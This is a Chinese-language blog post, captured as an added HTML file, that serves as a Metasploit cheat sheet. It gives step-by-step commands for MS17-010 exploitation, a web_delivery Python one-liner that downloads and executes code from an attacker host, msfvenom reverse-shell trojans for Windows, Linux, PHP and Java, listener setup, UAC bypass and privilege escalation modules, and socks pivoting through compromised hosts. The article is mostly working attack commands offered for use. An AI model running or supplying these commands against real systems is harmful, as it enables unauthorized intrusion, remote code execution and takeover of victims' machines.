@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>msf使用大全 | 东风往林</title>
+  <meta name="description" content="五大模块12345Auxiliaries		&#x2F;&#x2F;辅助模块Exploit			&#x2F;&#x2F;漏洞利用模块Playload		&#x2F;&#x2F;攻击载荷模块Post			&#x2F;&#x2F;后期渗透模块Encoders		&#x2F;&#x2F;编码模块  基本命令12345678910111213?&#x2F;help         	&#x2F;&amp;#x2F">
+<meta property="og:type" content="article">
+<meta property="og:title" content="msf使用大全">
+<meta property="og:url" content="http://example.com/2021/01/19/Metasploit/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="五大模块12345Auxiliaries		&#x2F;&#x2F;辅助模块Exploit			&#x2F;&#x2F;漏洞利用模块Playload		&#x2F;&#x2F;攻击载荷模块Post			&#x2F;&#x2F;后期渗透模块Encoders		&#x2F;&#x2F;编码模块  基本命令12345678910111213?&#x2F;help         	&#x2F;&amp;#x2F">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-01-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-03-09T11:04:18.945Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="工具">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://example.com/2021/01/19/Metasploit/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="../images/avatar.jpg" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">东风往林</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> ShanTou, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/noevery" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>渗透感悟：最重要的是信息收集！通过实战一点一点完善自己的渗透流程，最终目标是getshell。</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">9</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" rel="tag">通用漏洞</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/python/" style="font-size: 13px;">python</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 13.5px;">信息收集</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 13px;">内网</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 14px;">实战</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 13.5px;">工具</a> <a href="/tags/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" style="font-size: 13px;">通用漏洞</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/08/30/%E4%B8%80%E6%AC%A1%E8%A1%A5%E5%A4%A9%E5%85%AC%E7%9B%8A%E5%88%B7%E6%B4%9E%E8%BF%87%E7%A8%8B/" class="title">一次补天公益刷洞过程</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-08-30T01:13:47.278Z" itemprop="datePublished">2021-08-30</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/06/17/webpack%E5%8F%8D%E7%BC%96%E8%AF%91/" class="title">webpack反编译</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-06-17T07:04:39.220Z" itemprop="datePublished">2021-06-17</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/06/15/dedecms%E6%8C%96%E6%8E%98/" class="title">dedecms挖掘</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-06-15T01:34:23.330Z" itemprop="datePublished">2021-06-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/05/04/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/" class="title">攻防演练</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-05-04T01:24:23.628Z" itemprop="datePublished">2021-05-04</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/04/16/input%E7%B1%BB%E5%9E%8B%E4%B8%BAhidden%E6%97%B6%E8%A7%A6%E5%8F%91xss/" class="title">input类型为hidden时触发xss</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-04-16T09:01:29.625Z" itemprop="datePublished">2021-04-16</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-Metasploit" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      msf使用大全
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2021/01/19/Metasploit/" class="article-date">
+	  <time datetime="2021-01-18T16:00:00.000Z" itemprop="datePublished">2021-01-19</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a>, <a class="article-tag-link-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a>
+  </span>
+
+
+        
+
+	<span class="article-read hidden-xs">
+    	<i class="icon icon-eye-fill" aria-hidden="true"></i>
+    	<span id="/2021/01/19/Metasploit/" class="leancloud_visitors"  data-flag-title="msf使用大全">0</span>
+    </span>
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/01/19/Metasploit/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h3 id="五大模块"><a href="#五大模块" class="headerlink" title="五大模块"></a>五大模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Auxiliaries		&#x2F;&#x2F;辅助模块</span><br><span class="line">Exploit			&#x2F;&#x2F;漏洞利用模块</span><br><span class="line">Playload		&#x2F;&#x2F;攻击载荷模块</span><br><span class="line">Post			&#x2F;&#x2F;后期渗透模块</span><br><span class="line">Encoders		&#x2F;&#x2F;编码模块</span><br></pre></td></tr></table></figure>
+
+<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?&#x2F;help         	&#x2F;&#x2F;查看帮助信息</span><br><span class="line">? 命令名	     	&#x2F;&#x2F;查看命令如何使用</span><br><span class="line">search         	&#x2F;&#x2F;查找</span><br><span class="line">use			   	&#x2F;&#x2F;使用某一工具</span><br><span class="line">back           	&#x2F;&#x2F;返回</span><br><span class="line">info 模块名     	&#x2F;&#x2F;显示模块信息</span><br><span class="line">show options   	&#x2F;&#x2F;显示所有选项</span><br><span class="line">set 			&#x2F;&#x2F;给一个选项赋值到全局变量</span><br><span class="line">unset			&#x2F;&#x2F;取消选项的赋值</span><br><span class="line">unsetg			&#x2F;&#x2F;取消一个选项赋值到全局变量</span><br><span class="line">version			&#x2F;&#x2F;显示MSF和控制台版本</span><br><span class="line">show payloads	&#x2F;&#x2F;显示所有payload</span><br><span class="line">jobs			&#x2F;&#x2F;查看代理</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="模块的使用"><a href="#模块的使用" class="headerlink" title="模块的使用"></a>模块的使用</h2><h3 id="升级模块命令"><a href="#升级模块命令" class="headerlink" title="升级模块命令"></a>升级模块命令</h3><ul>
+<li>如果搜索不到最新的Exploit，可以输入以下命令进行升级，获取最新的模块</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfupdate</span><br></pre></td></tr></table></figure>
+
+<h3 id="扫描模块"><a href="#扫描模块" class="headerlink" title="扫描模块"></a>扫描模块</h3><h4 id="常见扫描模块"><a href="#常见扫描模块" class="headerlink" title="常见扫描模块"></a>常见扫描模块</h4><table>
+<thead>
+<tr>
+<th align="center">模块</th>
+<th align="center">功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">auxiliary/scanner/portscan</td>
+<td align="center">端口扫描</td>
+</tr>
+<tr>
+<td align="center">auxiliary/scanner/smb/smb_version</td>
+<td align="center">SMB系统版本扫描</td>
+</tr>
+<tr>
+<td align="center">auxiliary/scanner/smb/smb_enumusers</td>
+<td align="center">SMB枚举</td>
+</tr>
+<tr>
+<td align="center">auxiliary/scanner/smb/smb_login</td>
+<td align="center">SMB弱口令扫描</td>
+</tr>
+<tr>
+<td align="center">auxiliary/scanner/smb/psexec_command</td>
+<td align="center">SMB登录且执行命令</td>
+</tr>
+<tr>
+<td align="center">auxiliary/scanner/ssh/ssh_login</td>
+<td align="center">SSH登录测试</td>
+</tr>
+<tr>
+<td align="center">scanner/mssql_ping</td>
+<td align="center">MSSQL主机信息扫描</td>
+</tr>
+<tr>
+<td align="center">admin/scanner/mssql_enum</td>
+<td align="center">MSSQL枚举</td>
+</tr>
+<tr>
+<td align="center">admin/scanner/mssql_exec</td>
+<td align="center">MSSQL执行命令</td>
+</tr>
+<tr>
+<td align="center">admin/scanner/mssql_sql</td>
+<td align="center">MSSQL查询</td>
+</tr>
+<tr>
+<td align="center">scanner/scanner/mssql_login</td>
+<td align="center">MSSQL弱口令扫描</td>
+</tr>
+<tr>
+<td align="center">auxiliary/admin/mysql/mysql_enum</td>
+<td align="center">MySQL枚举</td>
+</tr>
+<tr>
+<td align="center">auxiliary/admin/mysql/mysql_sql</td>
+<td align="center">MySQL语句执行</td>
+</tr>
+<tr>
+<td align="center">auxiliary/scanner/mysql/mysql_login</td>
+<td align="center">MySQL弱口令扫描</td>
+</tr>
+<tr>
+<td align="center">auxiliary/scanner/smtp/smtp_version</td>
+<td align="center">SMTP版本扫描</td>
+</tr>
+<tr>
+<td align="center">auxiliary/scanner/smtp/smtp_enum</td>
+<td align="center">SMTP枚举</td>
+</tr>
+<tr>
+<td align="center">auxiliary/scanner/snmp/community</td>
+<td align="center">SNMP扫描设备</td>
+</tr>
+<tr>
+<td align="center">auxiliary/scanner/telnet/telnet_login</td>
+<td align="center">TELNET登录</td>
+</tr>
+<tr>
+<td align="center">scanner/vnc/vnc_none_auth</td>
+<td align="center">VNC空口令扫描</td>
+</tr>
+</tbody></table>
+<h4 id="系统信息模块"><a href="#系统信息模块" class="headerlink" title="系统信息模块"></a>系统信息模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br></pre></td></tr></table></figure>
+
+<h4 id="端口扫描模块"><a href="#端口扫描模块" class="headerlink" title="端口扫描模块"></a>端口扫描模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search portscan</span><br><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp </span><br></pre></td></tr></table></figure>
+
+<h4 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use windows&#x2F;gather&#x2F;arp_scanner</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>还可以在反弹回来的shell中使用</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;  run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.80.127&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<h5 id="arp探测存活主机"><a href="#arp探测存活主机" class="headerlink" title="arp探测存活主机"></a>arp探测存活主机</h5><ul>
+<li>如果目标机开启了防火墙，就需要用arp来探测</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; run arp_scanner -r 192.168.11.31&#x2F;24</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h3><h4 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h4><ul>
+<li> 永恒之蓝  攻击端口号：445  补丁编号：401开头，如果没打补丁，但防火墙限制了445端口访问，也不能成功攻击</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search MS17-010    		&#x2F;&#x2F;搜索17-010模块</span><br><span class="line">use 1					&#x2F;&#x2F;通常使用0编号模块或者1</span><br><span class="line">set rhost [目标机ip]    </span><br><span class="line">run						&#x2F;&#x2F;其他项默认设置，如果开启了代理ip，lhost要设置代理ip</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>成功会返回一个shell，如果不成功需要多打几次</li>
+</ul>
+<h4 id="web-delivery"><a href="#web-delivery" class="headerlink" title="web_delivery"></a>web_delivery</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search web_delivery 				&#x2F;&#x2F;首先搜索模块</span><br><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery  		&#x2F;&#x2F;选择模块</span><br><span class="line">set lhost [这里是你自己的ip]				&#x2F;&#x2F;设置攻击机ip</span><br><span class="line">show targets						&#x2F;&#x2F;选择攻击的脚本，默认为python</span><br><span class="line">run					&#x2F;&#x2F;运行后会生成一段payload代码</span><br></pre></td></tr></table></figure>
+
+<p>payload:  python -c “import sys; u=<strong>import</strong>(‘urllib’+{2:’’,3:’.request’}[sys.version_info[0]],fromlist=(‘urlopen’,));r=u.urlopen(‘<a target="_blank" rel="noopener" href="http://192.168.0.102:8080/UrY3oE&#39;);exec(r.read());&quot;">http://192.168.0.102:8080/UrY3oE&#39;);exec(r.read());&quot;</a></p>
+<ul>
+<li><p>上面代码为选择python运行后生成的代码</p>
+</li>
+<li><p>复制payload到目标机上面运行</p>
+</li>
+<li><p>返回kai liunx攻击机，已经反弹回了一个session</p>
+</li>
+<li><p>输入sessions [返回的编号]进入，成功获取了目标机</p>
+</li>
+</ul>
+<h3 id="监听模块"><a href="#监听模块" class="headerlink" title="监听模块"></a>监听模块</h3><h4 id="msfvenom参数"><a href="#msfvenom参数" class="headerlink" title="msfvenom参数"></a>msfvenom参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lhost      	&#x2F;&#x2F;监听的ip地址，通常选择本机ip</span><br><span class="line">lport      	&#x2F;&#x2F;监听的端口号</span><br><span class="line">-p         	&#x2F;&#x2F;选择最后生成的木马类型</span><br><span class="line">-o 		  	&#x2F;&#x2F;指定路径</span><br><span class="line">-f			&#x2F;&#x2F;指定后缀名</span><br></pre></td></tr></table></figure>
+
+<h4 id="msfvenom生成木马方式"><a href="#msfvenom生成木马方式" class="headerlink" title="msfvenom生成木马方式"></a>msfvenom生成木马方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lport&#x3D;7777 lhost&#x3D;192.168.80.127 -f exe -o &#x2F;root&#x2F;muma.exe</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>windows木马</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp lport&#x3D;7777 lhost&#x3D;192.168.80.127 -f elf -o &#x2F;root&#x2F;muma.elf</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>linux木马</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp lport&#x3D;7777 lhost&#x3D;192.168.80.127 -f raw -o &#x2F;root&#x2F;muma.php </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>php木马页面，将页面放在php服务器上既可反弹shell</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;meterpreter&#x2F;reverse_tcp LPORT&#x3D;777 LHOST&#x3D;192.168.80.127 -f war -o muma.war</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>jsp木马页面，用在tomcat中间件漏洞上</li>
+</ul>
+<h4 id="设置监听"><a href="#设置监听" class="headerlink" title="设置监听"></a>设置监听</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use multi&#x2F;handler		&#x2F;&#x2F;使用监听模块</span><br><span class="line">set lhost [本机ip]		&#x2F;&#x2F;生成木马指定的ip</span><br><span class="line">set lport [端口] 			&#x2F;&#x2F;生成木马指定的端口</span><br><span class="line">set payload [攻击脚本]		&#x2F;&#x2F;生成木马指定的脚本</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>设置好监听run运行，将生成的木马放在目标机上运行，就能反弹回shell到指定的监听ip，通常监听的ip写本机ip</li>
+</ul>
+<h4 id="msf的一个特性"><a href="#msf的一个特性" class="headerlink" title="msf的一个特性"></a>msf的一个特性</h4><ul>
+<li>运行木马反弹shell的时候，目标机会自动多出一个notepad.ext（记事本）的进程</li>
+</ul>
+<h3 id="提权模块"><a href="#提权模块" class="headerlink" title="提权模块"></a>提权模块</h3><h4 id="UAC模块"><a href="#UAC模块" class="headerlink" title="UAC模块"></a>UAC模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search uac</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac </span><br></pre></td></tr></table></figure>
+
+<h4 id="ms16-032"><a href="#ms16-032" class="headerlink" title="ms16_032"></a>ms16_032</h4><ul>
+<li>搜索模块</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms16032 		&#x2F;&#x2F;选择对应模块</span><br><span class="line">use windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc</span><br><span class="line">set session 1		&#x2F;&#x2F;设置session，其他默认，进行攻击</span><br><span class="line">run					&#x2F;&#x2F;成功的话会返回一个新的meterpreter</span><br></pre></td></tr></table></figure>
+
+<h4 id="14-058"><a href="#14-058" class="headerlink" title="14-058"></a>14-058</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search 14-058</span><br></pre></td></tr></table></figure>
+
+<h3 id="代理模块"><a href="#代理模块" class="headerlink" title="代理模块"></a>代理模块</h3><p>添加代理的原因：假设本机在ip为192.168.80网段下，目标机A有两个网卡，一个为192.168.80（本机能够访问的网段），另一个网段为192.168.6，目标机B也在192.168.6下，本机访问不到目标机b,添加完代理后，目标机就能通过目标机A的路由添加，使用代理访问到目标机B</p>
+<ul>
+<li>使用代理模块的前提需要使用路由添加</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search socks   &#x2F;&#x2F;有scoks4或socks5等代理方式</span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks4a</span><br></pre></td></tr></table></figure>
+
+<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">srvhost 	&#x2F;&#x2F;设为本机ip</span><br><span class="line">srvport 	&#x2F;&#x2F;默认1080</span><br></pre></td></tr></table></figure>
+
+<h4 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h4><ul>
+<li>msf添加完代理后配合kali的proxychains代理工具</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf	&#x2F;&#x2F;查看代理配置</span><br><span class="line">socks4 [本机ip]	1080	  &#x2F;&#x2F;修改配置，保存</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用方式：只需要在需要使用的工具前使用proxychains</li>
+</ul>
